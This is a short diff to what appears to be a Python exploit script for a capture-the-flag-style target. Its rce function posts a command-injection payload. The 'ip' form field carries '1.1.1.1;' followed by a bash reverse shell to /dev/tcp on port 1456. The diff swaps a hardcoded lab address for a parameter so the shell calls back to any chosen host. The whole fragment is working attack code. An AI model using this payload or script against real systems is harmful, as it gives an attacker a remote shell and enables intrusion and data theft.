@@ -40,7 +40,7 @@ def rce(session,ip,url):
         "User-Agent": "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",
         "Cookie": session
     }
-    payload = r"/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.3/1456 0>&1'"
+    payload = f"/bin/bash -c '/bin/bash -i >& /dev/tcp/{ip}/1456 0>&1'"
     params = {"ip":f"1.1.1.1;{payload}","id":"12","action":"deny"}
     res = requests.post(url, data=params, allow_redirects=False, verify=False, headers=headers)
 
